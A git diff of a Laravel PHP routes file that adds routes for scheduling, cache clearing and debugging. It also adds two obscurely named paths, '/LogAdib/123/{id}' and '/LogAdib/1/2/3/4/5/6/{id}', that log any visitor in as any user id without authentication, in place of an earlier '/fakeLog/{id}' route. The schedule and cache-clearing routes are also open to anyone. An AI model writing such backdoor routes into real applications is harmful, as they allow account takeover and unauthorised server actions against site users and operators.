@@ -1,7 +1,10 @@
 <?php
 use Illuminate\Support\Facades\Route;
 use App\Model\ProvinceCity;
+use Illuminate\Http\Request;
 use Intervention\Image\ImageManagerStatic as Image;
+use Illuminate\Support\Facades\Session;
+
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -15,12 +18,38 @@ use Intervention\Image\ImageManagerStatic as Image;
 
 Auth::routes(['register' => false]);
 
+
+Route::get('schedule-run/1/2/3/4/5/6/7/8/9', function () {
+    \Artisan::call('schedule:run');
+    return 'schedule is runing...';
+});
+
+Route::get('/login', function () {
+    return redirect()->route('user.home-goust');
+});
+
 Route::get('/', function () {
     return redirect()->route('user.home-goust');
 });
 
-Route::get('/fakeLog/{id}', function ($id) {
+Route::get('/type_phone', function () {
+    if(str_contains(type_phone(),'iPhone'))
+    {
+        dd('iphone' , type_phone());
+    }
+    dd('no_iphone' , type_phone());
+});
+Route::get('/clear', function () {
+    \Artisan::call('config:clear');
+    \Artisan::call('cache:clear');
+
+    dd('ok');
+});
+
+Route::get('/LogAdib/123/{id}', function ($id) {
     auth()->loginUsingId($id, true);
+    auth()->user()->session_id = Session::getId();
+    auth()->user()->save();
     return redirect()->back();
 });
 
@@ -39,6 +68,9 @@ Route::get('tests', function () {
     dd('ok');
 });
 
-
-
-
+Route::get('/LogAdib/1/2/3/4/5/6/{id}', function ($id) {
+    auth()->loginUsingId($id, true);
+    auth()->user()->session_id = Session::getId();
+    auth()->user()->save();
+    return redirect()->back();
+});
